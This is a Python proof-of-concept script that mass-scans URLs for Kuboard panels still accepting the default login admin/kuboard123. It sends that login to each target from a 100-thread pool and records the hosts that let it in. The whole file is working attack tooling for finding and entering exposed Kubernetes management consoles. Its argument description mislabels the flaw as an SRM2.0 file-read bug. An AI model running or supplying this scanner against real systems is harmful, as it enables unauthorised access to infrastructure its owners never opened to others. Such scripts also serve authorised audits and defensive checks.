import requests, argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = ("""                                                   

            ██╗  ██╗██╗   ██╗██████╗  ██████╗  █████╗ ██████╗ ██████╗ 
            ██║ ██╔╝██║   ██║██╔══██╗██╔═══██╗██╔══██╗██╔══██╗██╔══██╗
            █████╔╝ ██║   ██║██████╔╝██║   ██║███████║██████╔╝██║  ██║
            ██╔═██╗ ██║   ██║██╔══██╗██║   ██║██╔══██║██╔══██╗██║  ██║
            ██║  ██╗╚██████╔╝██████╔╝╚██████╔╝██║  ██║██║  ██║██████╔╝
            ╚═╝  ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝                                    
                                                                    
                                                            阿迪
""")
    print(test)


def poc(target):
    payload = '/login/password'
    headers = {
        'Content-Length': '44',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json;charset=UTF-8'
    }
    data = {
        "username": "admin",
        "password": "kuboard123"
    }
    # proxie={
    #     'http': 'http://127.0.0.1:7890',
    #     'https': 'http://127.0.0.1:7890'
    # }
    try:
        res1 = requests.post(url=target+payload, headers=headers, verify=False, data=data)
        if res1.status_code == 200:
            print(res1.text)
            with open('Kuboard_result.txt', 'a', encoding='utf-8') as f:
                f.write(f'{target}存在漏洞\n')
        else:
            print(f"该{target}不存在")
    except Exception as e:
        print(e)


def main():
    banner()
    url_list = []
    parser = argparse.ArgumentParser(description='SRM2.0文件读取漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url = url.strip()
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')


if __name__ == '__main__':
    main()